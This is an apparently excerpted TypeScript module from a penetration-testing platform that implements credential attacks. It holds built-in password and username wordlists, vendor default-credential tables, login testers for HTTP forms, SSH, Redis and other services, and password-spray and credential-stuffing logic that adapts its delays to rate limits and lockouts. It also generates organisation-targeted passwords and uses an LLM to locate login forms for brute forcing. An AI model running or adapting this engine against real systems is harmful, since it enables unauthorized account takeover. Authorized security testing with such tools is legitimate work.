 ...
 *
 * Comprehensive credential testing for penetration testing engagements:
 *   1. Password List Management — built-in wordlists + custom upload support
 *   2. Web Login Brute Force — LLM-powered form detection, CSRF handling, CAPTCHA detection
 *   3. Service Port Brute Force — SSH, FTP, RDP, Telnet, MySQL, PostgreSQL, Redis, MSSQL, SMTP, SNMP
 *   4. Password Stuffing — breach credential pair testing with rate limiting
 *   5. Default Credential Testing — 100+ OEM defaults for network devices, cameras, IoT
 *   6. Lockout Detection — automatic detection of account lockout policies
 *   7. Spray Attacks — single password against many usernames (lockout-safe)
 *
 * Integrates with:
 *   - ZAP Proxy Orchestrator for authenticated scanning after credential discovery
 *   - WAF/NGFW Detection for rate-limit tuning
 *   - Domain Intel Pipeline for service discovery
 *
 * All credential testing respects Rules of Engagement (ROE) and lockout thresholds.
 *
 * @module credential-attack-engine
 */
...
export interface PasswordList {
  name: string;
  description: string;
  category: "common" | "default" | "breach" | "custom" | "targeted";
  passwords: string[];
  source?: string;
}
...
export interface UsernameList {
  name: string;
  description: string;
  category: "common" | "default" | "custom" | "enumerated";
  usernames: string[];
}
...
export interface AttackConfig {
  /** Attack mode */
  mode: "brute_force" | "password_spray" | "credential_stuffing" | "default_creds" | "dictionary";
  ...
  passwordListName?: string;
  usernameListName?: string;
  /** Rate limiting */
  ...
  lockoutDetection: boolean;
  lockoutThreshold: number;
  lockoutCooldownSec: number;
  /** Spray-specific */
  sprayDelayBetweenPasswordsSec?: number;
  /** Global limits */
...
export interface AttackResult {
  ...
  errors: string[];
  status: "completed" | "stopped_lockout" | "stopped_timeout" | "stopped_manual" | "error";
  rateInfo: {
...
export interface AttackSuccess {
  username: string;
  password: string;
  timestamp: number;
  responseCode?: number;
...
export interface LockoutDetection {
  detected: boolean;
  type: "account_lockout" | "ip_lockout" | "rate_limit" | "captcha" | "unknown";
  threshold?: number;
  cooldownSec?: number;
  indicators: string[];
}

// ─── Built-in Password Lists ──────────────────────────────────────────────

const BUILTIN_PASSWORD_LISTS: Record<string, PasswordList> = {
  top_100: {
  ...
  admin_defaults: {
    ...
    category: "default",
    passwords: [
      "admin", "administrator", "password", "admin123", "admin1234",
      "root", "toor", "pass", "test", "guest",
      "master", "changeme", "default", "1234", "12345",
      "123456", "password1", "password123", "admin@123", "Admin@123",
      "P@ssw0rd", "P@ssword1", "Welcome1", "Welcome123", "Passw0rd",
      "letmein", "qwerty", "abc123", "iloveyou", "trustno1",
      "p@ssw0rd", "admin2024", "admin2025", "admin2026", "secret",
      "manager", "supervisor", "operator", "system", "service",
      "support", "helpdesk", "backup", "oracle", "postgres",
      "mysql", "sa", "cisco", "enable", "class",
    ],
  },
  ...
  network_device_defaults: {
    ...
    category: "default",
    passwords: [
      "admin", "password", "1234", "cisco", "enable",
      "class", "public", "private", "default", "user",
      "guest", "manager", "monitor", "operator", "root",
      "toor", "ubnt", "pi", "raspberry", "alpine",
      "Fireitup", "fortigate", "fortinet", "pfsense", "vyos",
      "mikrotik", "aruba", "juniper", "netgear", "linksys",
      "dlink", "tplink", "asus", "belkin", "zyxel",
      "hikvision", "12345", "dahua", "admin1", "superadmin",
      "support", "tech", "service", "maintenance", "debug",
    ],
  },
  ...
  web_app_defaults: {
    ...
    passwords: [
      ...
      "test", "demo", "guest", "user", "manager",
      "tomcat", "s3cret", "manager1", "admin1", "changeit",
      "changeme", "secret", "passw0rd", "welcome", "letmein",
      "master", "vagrant", "bitnami", "xampp", "lamp",
      "mamp", "wamp", "docker", "jenkins", "hudson",
      "gitlab", "gitea", "gogs", "nexus", "sonar",
  ...
  keyboard_walks: {
    ...
    passwords: [
      ...
      "zxcvbn", "zxcvbnm", "1qaz2wsx", "1qaz2wsx3edc", "1q2w3e4r",
      "1q2w3e4r5t", "1q2w3e", "qazwsx", "qazwsxedc", "zaq1xsw2",
      "!qaz2wsx", "1qaz@wsx", "qwe123", "asd123", "zxc123",
      "q1w2e3r4", "a1s2d3f4", "1234qwer", "qwer1234", "asdf1234",
      "poiuytrewq", "lkjhgfdsa", "mnbvcxz", "0987654321", "pl,okm",
      "1234567890qwertyuiop", "qwertyuiop1234567890",
    ],
  },
};

const BUILTIN_USERNAME_LISTS: Record<string, UsernameList> = {
  common_admins: {
    name: "Common Admin Usernames",
    description: "Standard admin/root account names",
    category: "common",
    usernames: [
      "admin", "administrator", "root", "sysadmin", "superadmin",
      "sa", "dba", "webmaster", "postmaster", "hostmaster",
      "operator", "manager", "supervisor", "support", "helpdesk",
      "service", "system", "backup", "test", "demo",
      "guest", "user", "info", "web", "www",
      "ftp", "mail", "email", "contact", "security",
    ],
  },
  ...
  service_accounts: {
    ...
    usernames: [
      ...
      "deploy", "deployer", "ci", "cd", "build",
      "docker", "kubernetes", "k8s", "ansible", "puppet",
      "chef", "terraform", "vagrant", "nagios", "zabbix",
      "grafana", "prometheus", "elastic", "kibana", "logstash",
      "mysql", "postgres", "mongodb", "redis", "memcached",
      "rabbitmq", "kafka", "nginx", "apache", "httpd",
      "www-data", "nobody", "daemon", "bin", "sys",
    ],
  },
  ...
  network_defaults: {
    ...
    category: "default",
    usernames: [
      "admin", "root", "user", "cisco", "enable",
      "manager", "monitor", "operator", "guest", "ubnt",
      "pi", "vyos", "pfsense", "netgear", "linksys",
      "dlink", "tplink", "asus", "hikvision", "dahua",
      "supervisor", "tech", "service", "maintenance", "debug",
      "installer", "default", "factory", "setup", "config",
    ],
  },
};
...
const DEFAULT_CREDENTIALS: DefaultCredential[] = [
  ...
  { vendor: "Grafana", product: "Dashboard", protocol: "http_form", port: 3000, username: "admin", password: "admin", accessLevel: "admin" },
  ...
  { vendor: "Portainer", product: "Docker UI", protocol: "http_form", port: 9000, username: "admin", password: "admin", accessLevel: "admin" },
  ...
  { vendor: "SonarQube", product: "Code Quality", protocol: "http_form", port: 9000, username: "admin", password: "admin", accessLevel: "admin" },
...
type ProtocolTester = (
  ...
  password: string,
  timeoutMs: number,
) => Promise<{ success: boolean; responseCode?: number; responseSnippet?: string; error?: string }>;

async function testHttpForm(
  host: string, port: number, username: string, password: string, timeoutMs: number,
  loginUrl?: string, formAction?: string, usernameField?: string, passwordField?: string,
  csrfTokenName?: string, csrfTokenUrl?: string, successIndicator?: string, failureIndicator?: string,
  contentType?: "form" | "json",
): Promise<{ success: boolean; responseCode?: number; responseSnippet?: string; error?: string }> {
  try {
...
async function testSsh(
  ...
  // SSH testing via banner grab + auth attempt simulation
  ...
  try {
    ...
    return new Promise((resolve) => {
      ...
      socket.connect(port, host, () => {
        // Connection established — SSH service is running
        socket.on("data", (data) => {
          banner += data.toString();
          // We got the SSH banner — service is responsive
          socket.destroy();
          resolve({
            success: false, // Can't actually test auth without ssh2 library
...
async function testRedis(
  host: string, port: number, _username: string, password: string, timeoutMs: number,
): Promise<{ success: boolean; responseCode?: number; responseSnippet?: string; error?: string }> {
  try {
    const net = await import("net");
    return new Promise((resolve) => {
...
// Generic fallback for protocols without dedicated testers
async function testGenericTcp(
  host: string, port: number, _username: string, _password: string, timeoutMs: number,
): Promise<{ success: boolean; responseCode?: number; responseSnippet?: string; error?: string }> {
  try {
    const net = await import("net");
    return new Promise((resolve) => {
      ...
      socket.on("error", (err: any) => { resolve({ success: false, error: err.message }); });
    });
  } catch (err: any) {
    return { success: false, error: err.message };
  }
...
function getProtocolTester(protocol: ServiceProtocol): ProtocolTester {
  switch (protocol) {
    case "http_basic":
    case "http_digest":
...
function detectLockout(responses: Array<{ success: boolean; responseCode?: number; responseSnippet?: string; error?: string }>): LockoutDetection {
  const lockoutIndicators: string[] = [];
  ...
  // Check for HTTP 403 after multiple failures
  ...
  // Check for lockout keywords in responses
  ...
  // Check for connection refused (IP ban)
  ...
  const type = hasCaptcha ? "captcha"
    : has429 ? "rate_limit"
    : connectionRefused > 2 ? "ip_lockout"
    : "account_lockout";
...
/**
 * Execute a credential attack against a target.
 */
export async function executeCredentialAttack(config: AttackConfig): Promise<AttackResult> {
  const sessionId = `cred-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const startedAt = Date.now();
  const successfulLogins: AttackSuccess[] = [];
  const errors: string[] = [];
  let totalAttempts = 0;
  let lockoutsDetected = 0;
  let status: AttackResult["status"] = "completed";
  ...
  switch (config.mode) {
    ...
    default: {
      ...
      const passwordList = config.passwordListName
        ? BUILTIN_PASSWORD_LISTS[config.passwordListName]?.passwords || config.passwords || []
        : config.passwords || BUILTIN_PASSWORD_LISTS.top_100.passwords;
      for (const username of usernames) {
  ...
  // Global timeout
  const globalDeadline = startedAt + (config.globalTimeoutSec * 1000);

  // Track per-user attempt counts for lockout protection
  const userAttemptCounts = new Map<string, number>();
  const recentResponses: Array<{ success: boolean; responseCode?: number; responseSnippet?: string; error?: string }> = [];

  // Get the appropriate protocol tester
  ...
  for (const pair of pairs) {
    ...
    // For spray mode, add extra delay between password rounds
    if (config.mode === "password_spray" && config.sprayDelayBetweenPasswordsSec) {
      ...
      if (prevPair && prevPair.password !== pair.password) {
        ...
        await sleep(config.sprayDelayBetweenPasswordsSec * 1000);
      }
    }
    ...
    // Execute the test
    let result: { success: boolean; responseCode?: number; responseSnippet?: string; error?: string };

    try {
      if (isHttpForm) {
        result = await testHttpForm(
          config.target.host,
          config.target.port,
          pair.username,
          pair.password,
    ...
    if (config.lockoutDetection && totalAttempts % 5 === 0) {
      ...
      if (lockout.detected) {
        ...
        // For rate limiting, increase delay
        if (lockout.type === "rate_limit") {
          config.delayBetweenAttemptsMs = Math.min(config.delayBetweenAttemptsMs * 2, 10000);
          console.log(`[CredAttack] Increased delay to ${config.delayBetweenAttemptsMs}ms`);
        }

        // For account lockout, wait cooldown
        if (lockout.type === "account_lockout" && config.lockoutCooldownSec > 0) {
          ...
          await sleep(config.lockoutCooldownSec * 1000);
        }
      }
    }
  }
  ...
  const result: AttackResult = {
    ...
    rateInfo: {
      ...
      peakRequestsPerSec: 1000 / config.delayBetweenAttemptsMs,
...
/**
 * Get default credentials matching a specific protocol and port.
 */
export function getDefaultCredentialsForTarget(
  protocol: ServiceProtocol,
  port: number,
): DefaultCredential[] {
  return DEFAULT_CREDENTIALS.filter(c =>
    c.protocol === protocol || (c.port === port && isCompatibleProtocol(c.protocol, protocol))
  );
}

function isCompatibleProtocol(stored: ServiceProtocol, target: ServiceProtocol): boolean {
  const httpGroup: ServiceProtocol[] = ["http_form", "http_basic", "http_digest", "http_json_api"];
 ...
 */
export function getPasswordLists(): Array<{
  name: string;
  displayName: string;
  description: string;
  category: string;
 ...
 */
export function getUsernameLists(): Array<{
  name: string;
  displayName: string;
  description: string;
  category: string;
...
/**
 * Get passwords from a named list.
 */
export function getPasswordList(name: string): string[] {
  return BUILTIN_PASSWORD_LISTS[name]?.passwords || [];
}

/**
 * Get usernames from a named list.
 */
export function getUsernameList(name: string): string[] {
  return BUILTIN_USERNAME_LISTS[name]?.usernames || [];
}

/**
 * Get all default credentials (for UI display).
 */
export function getAllDefaultCredentials(): DefaultCredential[] {
  return [...DEFAULT_CREDENTIALS];
}

/**
 * Generate a targeted password list based on organization info.
 * Uses company name, domain, and common patterns to create likely passwords.
 */
export function generateTargetedPasswordList(orgInfo: {
  companyName: string;
  domain: string;
  industry?: string;
  foundedYear?: number;
  ...
  // Common patterns with company name
  passwords.push(
    `${name}admin`, `admin${name}`, `${name}pass`, `pass${name}`,
    `${name}123`, `${name}1234`, `${name}12345`, `${name}!`,
    `Welcome${name}`, `${nameCapitalized}Welcome`, `${nameCapitalized}1`,
  );
  ...
  if (orgInfo.foundedYear) {
    passwords.push(
      `${name}${orgInfo.foundedYear}`, `${nameCapitalized}${orgInfo.foundedYear}`,
      `${name}${orgInfo.foundedYear}!`, `${nameCapitalized}${orgInfo.foundedYear}!`,
    );
  }
...
/**
 * Use LLM to detect login form fields on a web page.
 * Returns form configuration for brute force attacks.
 */
export async function detectWebLoginForm(url: string): Promise<{
  detected: boolean;
  formConfig: Partial<AttackConfig["target"]> | null;
  analysis: string;
}> {
  try {
    const resp = await fetch(url, {
